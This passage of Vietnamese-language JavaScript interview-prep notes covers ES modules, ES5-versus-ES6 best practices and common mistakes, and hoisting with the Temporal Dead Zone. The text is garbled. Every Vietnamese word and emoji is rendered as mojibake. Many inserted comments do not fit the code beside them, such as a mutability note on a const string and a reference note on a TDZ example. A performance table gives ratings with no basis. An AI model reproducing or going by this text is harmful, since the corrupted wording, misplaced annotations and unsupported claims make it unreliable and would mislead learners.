 // Ch√∫ gi·∫£i: 10. MODULES - Import/Export
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî¥ ES5 - No Native Modules
// Ph·∫£i d√πng patterns nh∆∞ IIFE, CommonJS (Node.js), AMD (RequireJS)

 // Ch√∫ gi·∫£i: IIFE Pattern (Immediately Invoked Function Expression)
var MyModule = (function () {
  var privateVar = 'secret';

  function privateMethod() {
    console.log(privateVar);
  }

  return {
    publicMethod: function () {
      privateMethod();
    },
  };
})();

 // Ch√∫ gi·∫£i: CommonJS (Node.js)
 // Ch√∫ gi·∫£i: module.exports = { name: 'John', greet: function() {} };
 // Ch√∫ gi·∫£i: const user = require('./user');

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Native Modules (static analysis, tree-shaking)
// C√°ch ho·∫°t ƒë·ªông: Import/export statements, module scope ri√™ng bi·ªát

// Named exports (c√≥ th·ªÉ nhi·ªÅu per file)
export const PI = 3.14159;
export function calculateArea(radius: number) {
  return PI * radius * radius;
}
export class Circle {
  constructor(public radius: number) {}
}

 // Ch√∫ gi·∫£i: Default export (ch·ªâ 1 per file)
export default class User {
  constructor(public name: string) {}
}

 // Ch√∫ gi·∫£i: Import named exports
import { PI, calculateArea, Circle } from './math';

 // Ch√∫ gi·∫£i: Import default export
import User from './user';

 // Ch√∫ gi·∫£i: Import both
import User, { PI, calculateArea } from './combined';

 // Ch√∫ gi·∫£i: Rename imports
import { PI as PIValue } from './math';

 // Ch√∫ gi·∫£i: Import all
import * as MathUtils from './math';
MathUtils.PI; // Ch√∫ gi·∫£i: 3.14159
MathUtils.calculateArea(5);

 // Ch√∫ gi·∫£i: Re-export (module aggregation)
export { PI, calculateArea } from './math';
export { default as User } from './user';

 // Ch√∫ gi·∫£i: Dynamic imports (code splitting)
const module = await import('./heavy-module'); // Ch√∫ gi·∫£i: Lazy load
module.doSomething();

 // Ch√∫ gi·∫£i: Conditional imports
if (condition) {
  const { feature } = await import('./feature');
  feature();
}
```

**üéØ Best Practices (Th·ª±c H√†nh T·ªët):**

1. **‚úÖ Always use const/let** thay v√¨ var - block scoping an to√†n h∆°n
2. **‚úÖ Prefer arrow functions** cho callbacks v√† short functions
3. **‚úÖ Use template literals** cho string manipulation
4. **‚úÖ Destructure objects/arrays** ƒë·ªÉ code ng·∫Øn g·ªçn
5. **‚úÖ Use spread operator** cho cloning v√† merging
6. **‚úÖ Prefer async/await** over promise chains - d·ªÖ ƒë·ªçc h∆°n
7. **‚úÖ Use ES6 modules** thay v√¨ CommonJS trong modern projects
8. **‚úÖ Use default parameters** thay v√¨ manual checks
9. **‚úÖ Use class syntax** cho OOP - cleaner than prototypes
10. **‚úÖ Enable Babel** ho·∫∑c TypeScript cho transpilation v√† type safety

**‚ùå Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p):**

```typescript
// ‚ùå L·ªñI 1: D√πng var trong modern code
var name = 'John'; // ‚ùå Function scoped, c√≥ th·ªÉ g√¢y bugs

// ‚úÖ ƒê√öNG: D√πng const/let
const name = 'John'; // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn. B·∫•t bi·∫øn: gi√° tr·ªã kh√¥ng thay ƒë·ªïi sau khi t·∫°o; th∆∞·ªùng d√πng ƒë·ªÉ tr√°nh side-effect v√† d·ªÖ reasoning.
let age = 25; // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn.

// ‚ùå L·ªñI 2: Arrow function l√†m method (lose this binding)
const obj = {
  value: 42,
  getValue: () => this.value, // ‚ùå this = window, kh√¥ng ph·∫£i obj
};

// ‚úÖ ƒê√öNG: Regular function cho methods
const obj = {
  value: 42,
  getValue() {
    return this.value; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  },
};

// ‚ùå L·ªñI 3: Qu√™n await trong async function
async function fetchData() {
  const data = fetchUserES6('123'); // ‚ùå data l√† Promise, kh√¥ng ph·∫£i value
  console.log(data.name); // Ch√∫ gi·∫£i: undefined
}

// ‚úÖ ƒê√öNG: Await promise
async function fetchData() {
  const data = await fetchUserES6('123'); // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
  console.log(data.name); // Ch√∫ gi·∫£i: "John"
}

// ‚ùå L·ªñI 4: Sequential await khi c√≥ th·ªÉ parallel
async function slow() {
  const user1 = await fetchUser('1'); // Ch√∫ gi·∫£i: 100ms
  const user2 = await fetchUser('2'); // Ch√∫ gi·∫£i: 100ms
  const user3 = await fetchUser('3'); // Ch√∫ gi·∫£i: 100ms
 // Ch√∫ gi·∫£i: Total: 300ms
}

// ‚úÖ ƒê√öNG: Parallel v·ªõi Promise.all
async function fast() {
  const [user1, user2, user3] = await Promise.all([
    fetchUser('1'),
    fetchUser('2'),
    fetchUser('3'),
  ]);
 // Ch√∫ gi·∫£i: Total: 100ms
}

 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
const original = { a: 1, nested: { b: 2 } };
const copied = { ...original };
copied.nested.b = 99; // ‚ùå original.nested.b c≈©ng = 99!

// ‚úÖ ƒê√öNG: Deep copy cho nested structures
const copied = JSON.parse(JSON.stringify(original)); // Ch√∫ gi·∫£i: Simple way
// Ho·∫∑c d√πng lodash cloneDeep, structuredClone

 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 6: Destructuring v·ªõi missing properties (no default)
const { email } = user; // ‚ùå email = undefined n·∫øu kh√¥ng t·ªìn t·∫°i

// ‚úÖ ƒê√öNG: Provide default values
const { email = 'no-email@example.com' } = user; // Ch√∫ gi·∫£i: ‚úÖ

 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 7: Confuse default export vs named export
import User from './user'; // ‚ùå N·∫øu file export named, kh√¥ng ph·∫£i default

// ‚úÖ ƒê√öNG: Match export type
import { User } from './user'; // Ch√∫ gi·∫£i: ‚úÖ Named export
import User from './user'; // Ch√∫ gi·∫£i: ‚úÖ Default export
```

**üìä Performance Comparison:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              ES5 vs ES6+ PERFORMANCE IMPACT                  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                              ‚îÇ
‚îÇ  Feature                    ES5 Speed    ES6+ Speed  Winner ‚îÇ
‚îÇ  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ
‚îÇ  Variable access (var)      ‚ö°‚ö°‚ö°‚ö°‚ö°      -          ES5   ‚îÇ
‚îÇ  Variable access (let)      -            ‚ö°‚ö°‚ö°‚ö°      ES6   ‚îÇ
‚îÇ  Function call (regular)    ‚ö°‚ö°‚ö°‚ö°‚ö°      -          ES5   ‚îÇ
‚îÇ  Function call (arrow)      -            ‚ö°‚ö°‚ö°‚ö°‚ö°     ES6   ‚îÇ
‚îÇ  String concat (+)          ‚ö°‚ö°‚ö°‚ö°       -          ES5   ‚îÇ
‚îÇ  Template literals (``)     -            ‚ö°‚ö°‚ö°‚ö°‚ö°     ES6   ‚îÇ
‚îÇ  Object creation            ‚ö°‚ö°‚ö°‚ö°       -          ES5   ‚îÇ
‚îÇ  Class instantiation        -            ‚ö°‚ö°‚ö°‚ö°      ES6   ‚îÇ
‚îÇ  Array iteration (.map)     ‚ö°‚ö°‚ö°‚ö°       -          ES5   ‚îÇ
‚îÇ  For-of loop                -            ‚ö°‚ö°‚ö°‚ö°‚ö°     ES6   ‚îÇ
‚îÇ  Promise                    N/A          ‚ö°‚ö°‚ö°        ES6   ‚îÇ
‚îÇ  Async/Await                N/A          ‚ö°‚ö°‚ö°        ES6   ‚îÇ
‚îÇ                                                              ‚îÇ
‚îÇ  üí° Note: Performance kh√°c bi·ªát minimal trong most cases    ‚îÇ
‚îÇ     Code readability & maintainability quan tr·ªçng h∆°n!      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**‚úÖ Khi N√†o D√πng ES5 vs ES6+:**

**üî¥ D√πng ES5 khi:**
- Target IE11 v√† kh√¥ng th·ªÉ d√πng Babel
- Working v·ªõi legacy codebase kh√¥ng th·ªÉ refactor
- Extreme performance critical code (rare cases)

**üü¢ D√πng ES6+ khi:**
- Modern project (>99% cases)
- Target modern browsers (Chrome, Firefox, Safari, Edge)
- Want maintainable, readable code
- Using build tools (Webpack, Vite, Babel)
- TypeScript project
---
## 04. ‚é´ Q04: Hoisting & Temporal Dead Zone  

**P1: T√™n c√¢u h·ªèi:** ‚é´ Q04: Hoisting & Temporal Dead Zone  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (1-2 ph√∫t):**

**"Hoisting = khai b√°o ƒë∆∞·ª£c ƒë∆∞a l√™n ƒë·∫ßu scope. TDZ = v√πng kh√¥ng th·ªÉ truy c·∫≠p let/const tr∆∞·ªõc khi khai b√°o.**

**üîë Hoisting Behaviors:**

| Type | Hoisted? | Initialized? | Access Before Declaration |
|------|----------|--------------|---------------------------|
| **`var`** | ‚úÖ Yes | ‚úÖ Yes (`undefined`) | ‚úÖ OK (undefined) |
| **`let`** | ‚úÖ Yes | ‚ùå No (TDZ) | ‚ùå ReferenceError |
| **`const`** | ‚úÖ Yes | ‚ùå No (TDZ) | ‚ùå ReferenceError |
| **`function` declaration** | ‚úÖ Yes | ‚úÖ Yes (entire function) | ‚úÖ OK (callable) |
| **`function` expression** | ‚úÖ Yes (variable only) | ‚ùå No | ‚ùå ReferenceError/undefined |
| **`class`** | ‚úÖ Yes | ‚ùå No (TDZ) | ‚ùå ReferenceError |

// Ch√∫ th√≠ch ti·∫øng Vi·ªát cho c√°c thu·∫≠t ng·ªØ:
// - Hoisted = ƒë∆∞·ª£c ƒë∆∞a l√™n ƒë·∫ßu ph·∫°m vi
// - Initialized = ƒë∆∞·ª£c kh·ªüi t·∫°o
// - Access Before Declaration = truy c·∫≠p tr∆∞·ªõc khi khai b√°o
// - TDZ = Temporal Dead Zone, v√πng ch·∫øt t·∫°m th·ªùi
// - ReferenceError = l·ªói tham chi·∫øu
// - undefined = kh√¥ng x√°c ƒë·ªãnh
 // Ch√∫ gi·∫£i: - OK = ·ªïn
// - callable = c√≥ th·ªÉ g·ªçi
 // Ch√∫ gi·∫£i: - block scope = ph·∫°m vi kh·ªëi
// - function scope = ph·∫°m vi h√†m
// - per iteration = m·ªói l·∫ßn l·∫∑p
// - catch bugs = b·∫Øt l·ªói
 // Ch√∫ gi·∫£i: - early = s·ªõm
// - Creation phase = giai ƒëo·∫°n t·∫°o
// - Execution phase = giai ƒëo·∫°n th·ª±c thi
// - line-by-line = t·ª´ng d√≤ng
// - reassign = g√°n l·∫°i
// - avoid = tr√°nh
// - explicit = r√µ r√†ng
 // Ch√∫ gi·∫£i: - confusion = nh·∫ßm l·∫´n
// - ESLint rule = quy t·∫Øc ESLint
// - no-use-before-define = kh√¥ng s·ª≠ d·ª•ng tr∆∞·ªõc khi ƒë·ªãnh nghƒ©a

**üìä Detailed Explanation:**

1. **`var` Hoisting**:
   - Hoisted + initialized v·ªõi `undefined`.
   - Access tr∆∞·ªõc khai b√°o ‚Üí `undefined` (kh√¥ng error).
   ```js
   console.log(x); // Ch√∫ gi·∫£i: undefined
   var x = 5;
 // Ch√∫ gi·∫£i: Engine sees: var x = undefined; console.log(x); x = 5;
   ```

2. **`let/const` Hoisting + TDZ**:
   - Hoisted nh∆∞ng NOT initialized ‚Üí Temporal Dead Zone.
   - Access trong TDZ ‚Üí `ReferenceError`.
   - TDZ = t·ª´ ƒë·∫ßu block scope ƒë·∫øn d√≤ng khai b√°o.
   ```js
 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
   console.log(y); // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
   let y = 10; // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
   ```

3. **Function Declaration Hoisting**:
   - Entire function hoisted ‚Üí g·ªçi tr∆∞·ªõc khai b√°o OK.
   ```js
   hello(); // Ch√∫ gi·∫£i: "Hello!" ‚úÖ
   function hello() { console.log("Hello!"); }
   ```

4. **Function Expression**:
   - Variable hoisted nh∆∞ng function kh√¥ng.
   ```js
   hello(); // Ch√∫ gi·∫£i: TypeError: hello is not a function
   var hello = function() { console.log("Hello!"); };
   ```

**‚ö†Ô∏è Common Pitfalls:**
- **`typeof` trong TDZ**: `typeof x` v·ªõi `let x` ‚Üí ReferenceError (kh√¥ng safe nh∆∞ `var`).
- **Loop variables**: `var` trong loop ‚Üí function scope, `let` ‚Üí block scope per iteration.
  ```js
  for (var i = 0; i < 3; i++) {
    setTimeout(() => console.log(i)); // Ch√∫ gi·∫£i: 3, 3, 3 (same i)
  }
  for (let i = 0; i < 3; i++) {
    setTimeout(() => console.log(i)); // Ch√∫ gi·∫£i: 0, 1, 2 (different i per iteration)
  }
  ```

**üí° Senior Insights:**
- **Why TDZ exists**: Force developers khai b√°o tr∆∞·ªõc khi d√πng ‚Üí catch bugs s·ªõm.
- **Hoisting mechanism**: JavaScript engine scans code 2 passes:
  1. **Creation phase**: Allocate memory cho declarations.
  2. **Execution phase**: Execute code line-by-line.
- **Best Practice**: 
  - D√πng `const` by default, `let` n·∫øu c·∫ßn reassign, avoid `var`.
  - Khai b√°o bi·∫øn ·ªü top c·ªßa scope ‚Üí explicit, tr√°nh confusion.
  - D√πng ESLint rule `no-use-before-define`.

---

**‚ö° Quick Summary:**
> Hoisting = Khai b√°o ƒë∆∞·ª£c ƒë∆∞a l√™n ƒë·∫ßu scope. `var` = undefined, `let/const` = TDZ ‚Üí ReferenceError

**üí° Ghi Nh·ªõ:**
- üî• **var**: Hoisted + initialized = undefined ‚Üí d√πng tr∆∞·ªõc khai b√°o OK (nh∆∞ng undefined)
- ‚ö° **let/const**: Hoisted nh∆∞ng NOT initialized ‚Üí TDZ ‚Üí ReferenceError
- üéØ **function declaration**: Hoisted to√†n b·ªô ‚Üí g·ªçi tr∆∞·ªõc khai b√°o OK
- ‚è∞ **TDZ**: V√πng t·ª´ ƒë·∫ßu scope ƒë·∫øn d√≤ng khai b√°o - bi·∫øn t·ªìn t·∫°i nh∆∞ng kh√¥ng access ƒë∆∞·ª£c


**Tr·∫£ l·ªùi:**

- **Hoisting**: C∆° ch·∫ø ƒë∆∞a declarations l√™n ƒë·∫ßu scope tr∆∞·ªõc khi code execute
- **TDZ (Temporal Dead Zone)**: V√πng t·ª´ ƒë·∫ßu block scope ƒë·∫øn d√≤ng khai b√°o let/const - kh√¥ng th·ªÉ access bi·∫øn
- **∆Øu ƒëi·ªÉm**: Function hoisting cho ph√©p t·ªï ch·ª©c code linh ho·∫°t
- **Nh∆∞·ª£c ƒëi·ªÉm**: var hoisting g√¢y confusion, TDZ errors kh√≥ debug

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// ‚úÖ Function Declaration - hoisted ho√†n to√†n
console.log(sayHello('World')); // Ch√∫ gi·∫£i: "Hello World" ‚úÖ
function sayHello(name: string): string {
  return `Hello ${name}`;
}

// ‚ùå Function Expression - kh√¥ng hoisted
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
const sayGoodbye = (name: string) => `Goodbye ${name}`;

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// 2. VAR HOISTING (kh√¥ng c√≥ TDZ)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

console.log(x); // undefined ‚úÖ (kh√¥ng l·ªói)
var x = 5;
console.log(x); // Ch√∫ gi·∫£i: 5

// JavaScript "nh√¨n" code nh∆∞:
 // Ch√∫ gi·∫£i: var x = undefined;
 // Ch√∫ gi·∫£i: console.log(x);
 // Ch√∫ gi·∫£i: x = 5;

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

{
  // ‚Üê TDZ B·∫ÆT ƒê·∫¶U cho bi·∫øn y
  
  // console.log(y); // ‚ùå ReferenceError - ƒëang trong TDZ!
  // console.log(typeof y); // ‚ùå ReferenceError - typeof c≈©ng kh√¥ng safe!
  
  let y = 10; // ‚Üê TDZ K·∫æT TH√öC
  console.log(y); // Ch√∫ gi·∫£i: ‚úÖ 10
}

// So s√°nh var vs let
function compare() {
  console.log(a); // undefined ‚úÖ - var kh√¥ng c√≥ TDZ
  var a = 1;
  
  // console.log(b); // ‚ùå ReferenceError - let c√≥ TDZ
  let b = 2;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// 4. TDZ PITFALLS - Nh·ªØng c√°i b·∫´y
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
{
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  let x = 1;
}

 // Ch√∫ gi·∫£i: Pitfall 2: Nested scopes
let outer = 'outer';
{
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  // Inner scope ƒë√£ "claim" bi·∫øn outer ‚Üí TDZ
  let outer = 'inner';
}

 // Ch√∫ gi·∫£i: Pitfall 3: Default parameters
 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm. Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
function fn(a = 1, b = a) {} // ‚úÖ OK - a ƒë√£ initialize

 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
// const p = new Person(); // ‚ùå ReferenceError - class c√≥ TDZ
class Person {}
```

**Best Practices:**

```typescript
// ‚úÖ Khai b√°o variables ·ªü ƒë·∫ßu scope
function good() {
  const a = 1;
  let b = 2;
 // Ch√∫ gi·∫£i: ... logic
}

// ‚úÖ D√πng const/let, tr√°nh var
const API_URL = 'https://api.com'; // const cho values kh√¥ng ƒë·ªïi
let count = 0; // Ch√∫ gi·∫£i: let khi c·∫ßn re-assign

 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
helper(); // Ch√∫ gi·∫£i: ‚úÖ OK
function helper() {}

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
const process = (data) => data.map(x => x * 2);
```

**Common Mistakes:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Mistake 1: var trong loops
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 3, 3, 3 ‚ùå
}

 // Ch√∫ gi·∫£i: ‚úÖ Fix: let trong loops
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Ch√∫ gi·∫£i: 0, 1, 2 ‚úÖ
}

 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
{
